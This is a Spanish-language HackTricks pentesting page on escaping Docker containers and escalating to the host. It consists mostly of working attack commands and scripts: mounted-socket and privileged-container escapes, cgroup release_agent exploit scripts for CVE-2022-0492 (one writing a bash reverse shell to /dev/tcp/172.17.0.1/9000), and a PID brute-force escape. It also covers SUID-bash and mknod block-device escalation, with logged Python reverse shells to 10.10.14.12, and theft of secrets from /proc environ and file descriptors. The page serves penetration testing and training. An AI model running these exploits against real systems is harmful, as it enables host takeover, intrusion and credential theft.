# Docker Breakout / Privilege Escalation

{{#include ../../../../banners/hacktricks-training.md}}

## Enumeración Automática y Escape

- [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): También puede **enumerar contenedores**
- [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Esta herramienta es bastante **útil para enumerar el contenedor en el que estás e incluso intentar escapar automáticamente**
- [**amicontained**](https://github.com/genuinetools/amicontained): Herramienta útil para obtener los privilegios que tiene el contenedor con el fin de encontrar formas de escapar de él
- [**deepce**](https://github.com/stealthcopter/deepce): Herramienta para enumerar y escapar de contenedores
- [**grype**](https://github.com/anchore/grype): Obtener los CVEs contenidos en el software instalado en la imagen

## Escape del Socket de Docker Montado

Si de alguna manera encuentras que el **socket de docker está montado** dentro del contenedor de docker, podrás escapar de él.\
Esto suele ocurrir en contenedores de docker que por alguna razón necesitan conectarse al demonio de docker para realizar acciones.
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
En este caso, puedes usar comandos de docker regulares para comunicarte con el daemon de docker:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
> [!NOTE]
> En caso de que el **socket de docker esté en un lugar inesperado**, aún puedes comunicarte con él usando el comando **`docker`** con el parámetro **`-H unix:///path/to/docker.sock`**

El daemon de Docker también podría estar [escuchando en un puerto (por defecto 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) o en sistemas basados en Systemd, la comunicación con el daemon de Docker puede ocurrir a través del socket de Systemd `fd://`.

> [!NOTE]
> Además, presta atención a los sockets de tiempo de ejecución de otros entornos de alto nivel:
>
> - dockershim: `unix:///var/run/dockershim.sock`
> - containerd: `unix:///run/containerd/containerd.sock`
> - cri-o: `unix:///var/run/crio/crio.sock`
> - frakti: `unix:///var/run/frakti.sock`
> - rktlet: `unix:///var/run/rktlet.sock`
> - ...

## Abuso de Capacidades para Escapar

Debes verificar las capacidades del contenedor, si tiene alguna de las siguientes, podrías ser capaz de escapar de él: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

Puedes verificar las capacidades actuales del contenedor usando **herramientas automáticas mencionadas anteriormente** o:
```bash
capsh --print
```
En la siguiente página puedes **aprender más sobre las capacidades de linux** y cómo abusar de ellas para escapar/escalar privilegios:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Escape de Contenedores Privilegiados

Un contenedor privilegiado puede ser creado con la bandera `--privileged` o deshabilitando defensas específicas:

- `--cap-add=ALL`
- `--security-opt apparmor=unconfined`
- `--security-opt seccomp=unconfined`
- `--security-opt label:disable`
- `--pid=host`
- `--userns=host`
- `--uts=host`
- `--cgroupns=host`
- `Mount /dev`

La bandera `--privileged` reduce significativamente la seguridad del contenedor, ofreciendo **acceso irrestricto a dispositivos** y eludiendo **varias protecciones**. Para un desglose detallado, consulta la documentación sobre los impactos completos de `--privileged`.

{{#ref}}
../docker-privileged.md
{{#endref}}

### Privilegiado + hostPID

Con estos permisos puedes simplemente **moverte al espacio de nombres de un proceso que se ejecuta en el host como root** como init (pid:1) solo ejecutando: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

Prueba esto en un contenedor ejecutando:
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### Privilegiado

Solo con la bandera privilegiada puedes intentar **acceder al disco del host** o intentar **escapar abusando de release_agent u otras escapatorias**.

Prueba los siguientes bypasses en un contenedor ejecutando:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### Montaje de Disco - Poc1

Los contenedores de docker bien configurados no permitirán comandos como **fdisk -l**. Sin embargo, en un comando de docker mal configurado donde se especifica la bandera `--privileged` o `--device=/dev/sda1` con mayúsculas, es posible obtener los privilegios para ver la unidad del host.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

Así que para tomar el control de la máquina host, es trivial:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
¡Y voilà! Ahora puedes acceder al sistema de archivos del host porque está montado en la carpeta `/mnt/hola`.

#### Montaje de Disco - Poc2

Dentro del contenedor, un atacante puede intentar obtener un acceso adicional al sistema operativo subyacente del host a través de un volumen hostPath escribible creado por el clúster. A continuación se presentan algunas cosas comunes que puedes verificar dentro del contenedor para ver si puedes aprovechar este vector de ataque:
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### Escape de privilegios Abusando del release_agent existente ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
```bash:Initial PoC
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
#### Escape de privilegios abusando de release_agent creado ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
```bash:Second PoC
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
Encuentra una **explicación de la técnica** en:

{{#ref}}
docker-release_agent-cgroups-escape.md
{{#endref}}

#### Escape Privilegiado Abusando de release_agent sin conocer la ruta relativa - PoC3

En los exploits anteriores, se **divulga la ruta absoluta del contenedor dentro del sistema de archivos del host**. Sin embargo, este no siempre es el caso. En casos donde **no conoces la ruta absoluta del contenedor dentro del host**, puedes usar esta técnica:

{{#ref}}
release_agent-exploit-relative-paths-to-pids.md
{{#endref}}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
Ejecutar el PoC dentro de un contenedor privilegiado debería proporcionar una salida similar a:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### Escape de Privilegios Abusando de Montajes Sensibles

Hay varios archivos que pueden estar montados que dan **información sobre el host subyacente**. Algunos de ellos pueden incluso indicar **algo que debe ser ejecutado por el host cuando sucede algo** (lo que permitirá a un atacante escapar del contenedor).\
El abuso de estos archivos puede permitir que:

- release_agent (ya cubierto antes)
- [binfmt_misc](sensitive-mounts.md#proc-sys-fs-binfmt_misc)
- [core_pattern](sensitive-mounts.md#proc-sys-kernel-core_pattern)
- [uevent_helper](sensitive-mounts.md#sys-kernel-uevent_helper)
- [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

Sin embargo, puedes encontrar **otros archivos sensibles** para verificar en esta página:

{{#ref}}
sensitive-mounts.md
{{#endref}}

### Montajes Arbitrarios

En varias ocasiones encontrarás que el **contenedor tiene algún volumen montado desde el host**. Si este volumen no fue configurado correctamente, podrías ser capaz de **acceder/modificar datos sensibles**: Leer secretos, cambiar ssh authorized_keys…
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### Escalación de privilegios con 2 shells y montaje de host

Si tienes acceso como **root dentro de un contenedor** que tiene alguna carpeta del host montada y has **escapado como un usuario no privilegiado al host** y tienes acceso de lectura sobre la carpeta montada.\
Puedes crear un **archivo suid de bash** en la **carpeta montada** dentro del **contenedor** y **ejecutarlo desde el host** para escalar privilegios.
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### Escalación de privilegios con 2 shells

Si tienes acceso como **root dentro de un contenedor** y has **escapado como un usuario no privilegiado al host**, puedes abusar de ambas shells para **privesc dentro del host** si tienes la capacidad MKNOD dentro del contenedor (es por defecto) como [**se explica en esta publicación**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
Con tal capacidad, el usuario root dentro del contenedor puede **crear archivos de dispositivos de bloque**. Los archivos de dispositivos son archivos especiales que se utilizan para **acceder al hardware subyacente y a los módulos del kernel**. Por ejemplo, el archivo de dispositivo de bloque /dev/sda da acceso para **leer los datos en bruto del disco del sistema**.

Docker protege contra el uso indebido de dispositivos de bloque dentro de los contenedores al hacer cumplir una política de cgroup que **bloquea las operaciones de lectura/escritura de dispositivos de bloque**. Sin embargo, si un dispositivo de bloque es **creado dentro del contenedor**, se vuelve accesible desde fuera del contenedor a través del **/proc/PID/root/** directorio. Este acceso requiere que el **propietario del proceso sea el mismo** tanto dentro como fuera del contenedor.

Ejemplo de **explotación** de este [**informe**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

Si puedes acceder a los procesos del host, podrás acceder a mucha información sensible almacenada en esos procesos. Ejecuta el laboratorio de pruebas:
```
docker run --rm -it --pid=host ubuntu bash
```
Por ejemplo, podrás listar los procesos usando algo como `ps auxn` y buscar detalles sensibles en los comandos.

Luego, como puedes **acceder a cada proceso del host en /proc/ solo puedes robar sus secretos de entorno** ejecutando:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
También puedes **acceder a los descriptores de archivo de otros procesos y leer sus archivos abiertos**:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
También puedes **matar procesos y causar un DoS**.

> [!WARNING]
> Si de alguna manera tienes **acceso privilegiado sobre un proceso fuera del contenedor**, podrías ejecutar algo como `nsenter --target <pid> --all` o `nsenter --target <pid> --mount --net --pid --cgroup` para **ejecutar un shell con las mismas restricciones de ns** (esperemos que ninguna) **que ese proceso.**

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
Si un contenedor fue configurado con el controlador de red de Docker [host networking driver (`--network=host`)](https://docs.docker.com/network/host/), la pila de red de ese contenedor no está aislada del host de Docker (el contenedor comparte el espacio de nombres de red del host), y el contenedor no recibe su propia dirección IP asignada. En otras palabras, el **contenedor vincula todos los servicios directamente a la IP del host**. Además, el contenedor puede **interceptar TODO el tráfico de red que el host** está enviando y recibiendo en la interfaz compartida `tcpdump -i eth0`.

Por ejemplo, puedes usar esto para **esnifar e incluso suplantar tráfico** entre el host y la instancia de metadatos.

Como en los siguientes ejemplos:

- [Writeup: How to contact Google SRE: Dropping a shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
- [Metadata service MITM allows root privilege escalation (EKS / GKE)](https://blog.champtar.fr/Metadata_MITM_root_EKS_GKE/)

También podrás acceder a **servicios de red vinculados a localhost** dentro del host o incluso acceder a los **permisos de metadatos del nodo** (que pueden ser diferentes a los que un contenedor puede acceder).

### hostIPC
```bash
docker run --rm -it --ipc=host ubuntu bash
```
Con `hostIPC=true`, obtienes acceso a los recursos de comunicación entre procesos (IPC) del host, como **memoria compartida** en `/dev/shm`. Esto permite leer/escribir donde los mismos recursos IPC son utilizados por otros procesos del host o del pod. Usa `ipcs` para inspeccionar estos mecanismos IPC más a fondo.

- **Inspeccionar /dev/shm** - Busca archivos en esta ubicación de memoria compartida: `ls -la /dev/shm`
- **Inspeccionar instalaciones IPC existentes** – Puedes verificar si se están utilizando instalaciones IPC con `/usr/bin/ipcs`. Verifícalo con: `ipcs -a`

### Recuperar capacidades

Si la syscall **`unshare`** no está prohibida, puedes recuperar todas las capacidades ejecutando:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### Abuso del espacio de nombres de usuario a través de symlink

La segunda técnica explicada en la publicación [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) indica cómo puedes abusar de los montajes vinculados con espacios de nombres de usuario, para afectar archivos dentro del host (en ese caso específico, eliminar archivos).

## CVEs

### Exploit de Runc (CVE-2019-5736)

En caso de que puedas ejecutar `docker exec` como root (probablemente con sudo), intenta escalar privilegios escapando de un contenedor abusando de CVE-2019-5736 (exploit [aquí](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Esta técnica básicamente **sobrescribirá** el _**/bin/sh**_ binario del **host** **desde un contenedor**, por lo que cualquier persona que ejecute docker exec puede activar la carga útil.

Cambia la carga útil en consecuencia y construye el main.go con `go build main.go`. El binario resultante debe colocarse en el contenedor de docker para su ejecución.\
Al ejecutarlo, tan pronto como muestre `[+] Overwritten /bin/sh successfully`, necesitas ejecutar lo siguiente desde la máquina host:

`docker exec -it <container-name> /bin/sh`

Esto activará la carga útil que está presente en el archivo main.go.

Para más información: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

> [!NOTE]
> Hay otros CVEs a los que el contenedor puede ser vulnerable, puedes encontrar una lista en [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)

## Escape Personalizado de Docker

### Superficie de Escape de Docker

- **Espacios de nombres:** El proceso debe estar **completamente separado de otros procesos** a través de espacios de nombres, por lo que no podemos escapar interactuando con otros procs debido a los espacios de nombres (por defecto no pueden comunicarse a través de IPCs, sockets unix, servicios de red, D-Bus, `/proc` de otros procs).
- **Usuario root**: Por defecto, el usuario que ejecuta el proceso es el usuario root (sin embargo, sus privilegios son limitados).
- **Capacidades**: Docker deja las siguientes capacidades: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
- **Syscalls**: Estas son las syscalls que el **usuario root no podrá llamar** (debido a la falta de capacidades + Seccomp). Las otras syscalls podrían usarse para intentar escapar.

{{#tabs}}
{{#tab name="x64 syscalls"}}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{{#endtab}}

{{#tab name="syscalls arm64"}}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{{#endtab}}

{{#tab name="syscall_bf.c"}}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````

{{#endtab}}
{{#endtabs}}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

- Find the **path of the containers filesystem** inside the host
- You can do this via **mount**, or via **brute-force PIDs** as explained in the second release_agent exploit
- Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
- You should be able to **execute the trigger from inside the host**
- You need to know where the containers files are located inside the host to indicate a script you write inside the host
- Have **enough capabilities and disabled protections** to be able to abuse that functionality
- You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

- [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/_fel1x/status/1151487053370187776?lang=en-GB)
- [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
- [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
- [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

{{#include ../../../../banners/hacktricks-training.md}}
